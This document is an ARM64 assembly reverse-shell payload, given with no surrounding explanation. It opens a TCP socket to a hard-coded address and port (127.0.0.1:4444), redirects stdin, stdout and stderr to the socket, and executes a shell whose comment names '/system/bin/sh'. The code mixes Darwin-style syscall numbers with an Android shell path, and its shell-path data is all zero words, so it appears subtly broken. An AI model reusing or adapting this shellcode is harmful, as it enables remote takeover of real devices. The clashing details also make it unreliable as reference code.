.equ SYS_SOCKET, 0x61
.equ SYS_CONNECT, 0x62
.equ SYS_DUP2, 0x5a
.equ SYS_EXECVE, 0x3b
.equ SYS_EXIT, 0x01

.equ AF_INET, 0x2
.equ SOCK_STREAM, 0x1

.equ STDIN, 0x0
.equ STDOUT, 0x1
.equ STDERR, 0x2

.equ IP, 0x0100007f
.equ PORT, 0x5C11

_start:
        // sockfd = socket(AF_INET, SOCK_STREAM, 0)
        mov    x0, AF_INET
        mov    x1, SOCK_STREAM
        mov    x2, 0
        mov    x16, SYS_SOCKET
        svc    0
        mov    x3, x0

        // connect(sockfd, (struct sockaddr *)&server, sockaddr_len)
        adr    x1, sockaddr
        mov    x2, 0x10
        mov    x16, SYS_CONNECT
        svc    0
        cbnz   w0, exit

        // dup2(sockfd, STDIN) ...
        mov    x0, x3
        mov    x2, 0
        mov    x1, STDIN
        mov    x16, SYS_DUP2
        svc    0
        mov    x1, STDOUT
        mov    x16, SYS_DUP2
        svc    0
        mov    x1, STDERR
        mov    x16, SYS_DUP2
        svc    0

        // execve('/system/bin/sh', NULL, NULL)
        adr    x0, shell
        mov    x2, 0
        str    x0, [sp, 0]
        str    x2, [sp, 8]
        mov    x1, sp
        mov    x16, SYS_EXECVE
        svc    0

exit:
        mov    x0, 0
        mov    x16, SYS_EXIT
        svc    0

.balign 4
sockaddr:
        .short AF_INET
        .short PORT
        .word  IP

shell:
.word 0x00000000
.word 0x00000000
.word 0x00000000
.word 0x00000000
end:

